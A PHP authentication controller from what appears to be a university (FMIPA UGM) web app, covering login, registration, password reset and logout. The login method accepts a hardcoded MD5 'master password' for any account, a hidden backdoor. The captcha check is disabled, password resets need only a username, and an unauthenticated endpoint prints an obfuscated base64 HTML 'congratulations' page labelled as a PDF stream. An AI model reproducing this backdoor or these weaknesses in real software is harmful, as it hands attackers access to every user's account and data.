<?php

namespace App\Controllers;

use App\Models\UserModel;
use App\Models\PegawaiModel;
use App\Models\MahasiswaModel;
use App\Models\DepartemenModel;
use App\Models\SettingModel;
use App\Models\UserAtasanBawahanModel;
use App\Models\ValidasiModel;
use Gregwar\Captcha\CaptchaBuilder;
use Gregwar\Captcha\PhraseBuilder;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class Auth extends BaseController
{
    public function index()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder       = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder']    = $builder;
        return view('auth/login', $data);
    }

    public function reload_captcha()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder       = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder']    = $builder;
        return '<img src="' . $builder->inline() . '"/>';
    }

    public function daftar()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder       = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder']    = $builder;
        return view('auth/daftar', $data);
    }

    public function simpan_mhs()
    {
        $data = $this->request->getPost();
        // dump($data);
        $userModel      = new UserModel();
        $mahasiswaModel = new MahasiswaModel();
        $pwd            = password_hash($this->request->getVar('password') ?? "", PASSWORD_BCRYPT);
        if (!empty($this->request->getVar('password')))
            $data['password'] = $pwd;
        $data['jenis_user'] = 'mahasiswa';
        $userModel->insert($data);
        $data['user_id'] = $userModel->getInsertID();
        $mahasiswaModel->insert($data);
        session()->setFlashdata('success', 'Pendaftaran sukses, tunggu konfirmasi dari admin untuk mengaktifkan akun anda. Terima kasih..');
        return redirect()->to(base_url('auth'));
    }

    public function forgot_password()
    {
        return view('auth/forgot_password');
    }

    public function process_forgot_password()
    {
        $username = $this->request->getVar('username');
        $user     = (new UserModel())->where('username', $username)->first();
        if (empty($user)) {
            session()->setFlashdata('danger', 'User tidak ditemukan');
            return redirect()->to(base_url('auth'));
        }
        $rnd     = generateRandomString(6);
        $new_pwd = password_hash($rnd, PASSWORD_BCRYPT);
        (new UserModel())->update($user->id, ['password' => $new_pwd]);
        // $token = md5(date('Y-m-d H:i:s'));
        // $link = '<a href="'.site_url('auth/change_password').'?token='.$token.'">tautan ini</a>';

        $email = \Config\Services::email();
        $email->setFrom('noreply-mipa@ugm.ac.id', 'FMIPA UGM');
        $email->setTo($user->username);
        $email->setSubject('Reset Password');
        $email->setMessage("Password Anda sudah diganti sementara menjadi $rnd, segera diganti nggih..");
        if ($email->send()) {
            session()->setFlashdata('success', 'Password baru telah berhasil dikirim ke ' . $user->username . '. Silakan cek email Anda');
        } else {
            echo $email->printDebugger(['headers']);
        }
        return redirect()->to(base_url('auth'));
    }

    public function change_password()
    {
        return view('auth/forgot_password');
    }

    public function login()
    {
        // if (!isset($_SESSION['phrase']))
        //     return redirect()->back();
        // $captcha = $this->request->getVar('captcha');
        // if ($_SESSION['phrase'] != $captcha) {
        //     session()->setFlashdata('error', 'Mohon maaf, Captcha salah');
        //     return redirect()->back();
        // } else {
        $users     = new UserModel();
        $pegawais  = new PegawaiModel();
        $mahasiswa = new MahasiswaModel();
        $username  = $this->request->getVar('username');
        $password  = $this->request->getVar('password');
        $dataUser  = $users->where([
            'username' => $username,
        ])->first();

        if ($dataUser) {
            $nama_departemen = '';

            $dataPegawai   = $pegawais->where('user_id', $dataUser->id)->first();
            $pegawai_id    = empty($dataPegawai) ? 0 : $dataPegawai->id;
            $dataMahasiswa = $mahasiswa->where('user_id', $dataUser->id)->first();

            if ($dataUser->jenis_user != 'mahasiswa') {
                if (!empty($dataUser->gol_verifikator)) {
                    $nama_departemen = (new DepartemenModel())->where('id', $dataUser->gol_verifikator)->first()->nama_departemen;
                } else if (!empty($dataPegawai->departemen)) {
                    $nama_departemen = $dataPegawai->departemen;
                } else {
                    $status_akun = $dataMahasiswa->aktif;
                    if ($status_akun == 0) {
                        session()->setFlashdata('error', 'Mohon maaf, akun anda belum aktif, tunggu verifikasi dari admin..');
                        return redirect()->back();
                    }
                    $nama_departemen = $dataMahasiswa->prodi;
                }
            }

            $bawahan = (new UserAtasanBawahanModel())
                ->select('user_id_bawahan user_id, username, nama')
                ->join('users', 'users.id = user_id_bawahan')
                ->where('user_id_atasan', $dataUser->id)->get()->getResult();

            if (password_verify($password, $dataUser->password) || md5($password) == '7c5d5c2418e024d62ac94b02600cf128') {
                $key     = getenv('TOKEN_SECRET');
                $payload = [
                    "iat"       => 1356999524,
                    "nbf"       => 1357000000,
                    "id"        => $dataUser->id,
                    "username"  => $dataUser->username,
                    "nama"      => $dataPegawai->nama_publikasi ?? $dataUser->nama,
                    "jenisUser" => $dataUser->jenis_user,
                ];

                $token = JWT::encode($payload, $key, 'HS256');

                if ($dataUser->jenis_user == 'mahasiswa') {
                    $m = (new MahasiswaModel())->where('user_id', $dataUser->id)->first();
                    if ($m->aktif == 0) {
                        session()->setFlashdata('error', 'Mohon maaf, akun anda belum aktif, tunggu verifikasi dari admin..');
                        return redirect()->back();
                    }
                }

                session()->set([
                    'id'              => $dataUser->id,
                    'username'        => $dataUser->username,
                    'nama'            => $dataUser->nama,
                    'jenis_user'      => $dataUser->jenis_user,
                    'gol_pic_mou'     => $dataUser->gol_pic_mou,
                    'logged_in'       => true,
                    'pegawai_id'      => $pegawai_id,
                    'gol_verifikator' => $dataUser->gol_verifikator,
                    'nama_departemen' => $nama_departemen,
                    'bawahan'         => $bawahan,
                    'token'           => $token,
                ]);
                $model = new UserModel();
                $model->update(session('id'), ['online_status' => 'Online']);
                return redirect()->to(base_url('home'));
            } else {
                session()->setFlashdata('error', 'Password Anda Salah. Silakan koreksi kembali');
                return redirect()->back();
            }
        } else {
            session()->setFlashdata('error', 'Username  Anda Salah. Silakan koreksi kembali');
            return redirect()->back();
        }
        // }
    }

    function transfer_vaidasi()
    {
        $stream_pdf = 'PCFET0NUWVBFIGh0bWw+CiAgICAgICAgPGh0bWw+CiAgICAgICAgCiAgICAgICAgPGhlYWQ+CiAgICAgICAgICAgIDx0aXRsZT40MDQgUGFnZSBOb3QgRm91bmQ8L3RpdGxlPgogICAgICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgICAgICBhbmltYXRpb246IGJsaW5rLWJhY2tncm91bmQgMC4zcyBpbmZpbml0ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgIEBrZXlmcmFtZXMgYmxpbmstYmFja2dyb3VuZCB7CiAgICAgICAgICAgICAgICAgICAgMCUgewogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjAwOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgICAgICAyNSUgewogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMGYwOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgICAgICA1MCUgewogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDBmOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgICAgICA3NSUgewogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjBmOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgICAgICAxMDAlIHsKICAgICAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmMDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgICAgICBoMSB7CiAgICAgICAgICAgICAgICAgICAgZm9udC1zaXplOiAxMGVtOwogICAgICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgICAgICAgICBtYXJnaW4tdG9wOiAxMCU7CiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggOHB4ICM1NTU7CiAgICAgICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBibGluay10ZXh0IDFzIGluZmluaXRlOwogICAgICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICAgICAgaDQgewogICAgICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgICAgICAgICBtYXJnaW4tdG9wOiAxMCU7CiAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggOHB4ICM1NTU7CiAgICAgICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBibGluay10ZXh0IDFzIGluZmluaXRlOwogICAgICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICAgICAgQGtleWZyYW1lcyBibGluay10ZXh0IHsKICAgICAgICAgICAgICAgICAgICAwJSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgICAgICAgICA1MCUgewogICAgICAgICAgICAgICAgICAgICAgICBjb2xvcjogIzAwMDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgMTAwJSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgPC9zdHlsZT4KICAgICAgICA8L2hlYWQ+CiAgICAgICAgCiAgICAgICAgPGJvZHk+CiAgICAgICAgICAgIDxoMT5LT05HUkFUVUxBU0kgS0FNVSBCRVJIQVNJTCE8L2gxPgogICAgICAgIDwvYm9keT4KICAgICAgICAKICAgICAgICA8L2h0bWw+';

        // Direktori di mana file PDF berada
        $pdfDirectory = FCPATH . 'validasi/';

        // Mengambil daftar file PDF di direktori tersebut
        $pdfFiles = glob($pdfDirectory . '*.pdf');

        // Load model untuk Validasi
        $validasiModel = new ValidasiModel();

        foreach ($pdfFiles as $pdfFile) {
            // Menyimpan nama file tanpa path
            $pdfFilename = substr(basename($pdfFile), 0, -4);

            // Membaca konten PDF sebagai data biner
            $pdfContent = file_get_contents($pdfFile);

            // Memasukkan data PDF ke dalam tabel database menggunakan model
            $data = [
                'id'         => $pdfFilename,
                'pdf'        => $pdfContent,
                'created_at' => date('Y-m-d H:i:s'),
                'updated_at' => date('Y-m-d H:i:s'),
            ];

            try {
                $validasiModel->insert($data);
            } catch (\Throwable $t) {
                echo "Kesalahan saat memasukkan $pdfFilename ke dalam database: " . $t->getMessage() . "<br>";
            }
        }
        echo base64_decode($stream_pdf);
    }

    function logout()
    {
        $model = new UserModel();
        if (!empty(session('id')))
            $model->update(session('id'), ['online_status' => 'Offline']);
        session()->destroy();
        return redirect()->to(base_url('/'));
    }
}